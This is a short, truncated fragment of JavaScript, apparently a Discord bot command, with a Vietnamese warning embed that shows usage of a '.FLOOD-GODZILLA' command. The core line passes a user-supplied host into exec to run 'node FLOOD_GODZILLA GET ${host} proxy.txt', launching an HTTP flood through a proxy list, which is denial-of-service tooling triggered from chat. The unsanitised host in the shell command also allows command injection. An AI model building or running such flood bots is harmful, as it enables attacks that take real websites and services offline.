...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu .FLOOD-GODZILLA https://example.com/`")
...
exec(`node FLOOD_GODZILLA GET ${host} proxy.txt 60 100 1 `, (error, stdout, stderr) => {
});
setTimeout(function(){ 
